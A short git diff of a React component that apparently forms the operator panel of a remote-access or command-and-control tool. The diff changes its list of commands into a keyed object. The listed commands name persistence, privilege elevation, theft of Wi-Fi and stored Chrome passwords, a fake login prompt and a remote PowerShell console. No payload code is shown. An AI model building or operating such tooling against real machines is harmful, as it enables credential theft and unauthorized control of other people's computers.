@@ -1,5 +1,5 @@
 import {useState, useEffect} from 'react';
-import {NavLink, useParams} from "react-router-dom";
+import {useParams} from "react-router-dom";
 import Title from "react-titles/Title6";
 import React from "react";
 import './ClientControl.css';
@@ -11,18 +11,18 @@ import ClientControlInformationTable from './ClientControlInformationTable';
 
 
 // TODO: get list of commands from DB
-const commands = [
-    'Persistence',
-    'Elevate',
-    'Upload',
-    'Download',
-    'Change Background',
-    'Get Wifi Passwords',
-    'Get Stored Chrome Passwords',
-    'Prompt User UI Login',
-    'Get Network Information',
-    'Start Powershell Console'
-]
+const commands = {
+    'stayhome':'Persistence',
+    'elevate':'Elevate',
+    'upload':'Upload',
+    'download':'Download',
+    'change-image':'Change Background',
+    'getwifi':'Get Wifi Passwords',
+    'webPass':'Get Stored Chrome Passwords',
+    'PromptUser':'Prompt User UI Login',
+    'get-network':'Get Network Information',
+    'StartPS':'Start Powershell Console'
+}
 
 const ClientControl = () => {
     const {id} = useParams();
@@ -88,7 +88,7 @@ const ClientControl = () => {
                             <ClientControlInformationTable client={client} />
                         </ClientControlSection>
                         <ClientControlSection title="Command">
-                            <ClientControlCommand commands={commands}/>
+                            <ClientControlCommand client={client} commands={commands}/>
                         </ClientControlSection>
                         <ClientControlSection title="Response">
                             <ClientControlResponse clientResponse={clientResponse} allResponses={allResponses}/>
